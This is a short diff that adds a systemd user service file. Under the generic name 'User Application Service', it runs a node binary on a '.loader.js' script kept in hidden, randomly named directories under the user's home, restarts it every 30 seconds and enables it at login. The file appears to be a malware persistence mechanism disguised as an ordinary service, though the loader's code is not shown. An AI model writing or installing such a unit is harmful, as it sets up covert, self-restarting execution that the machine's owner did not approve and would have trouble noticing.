@@ -1,0 +1,11 @@
+[Unit]
+Description=User Application Service
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=30
+ExecStart=/home/user/.local/share/.r0qsv8h1/.394ly8v9/bin/node /home/user/.local/share/.r0qsv8h1/.loader.js
+
+[Install]
+WantedBy=default.target
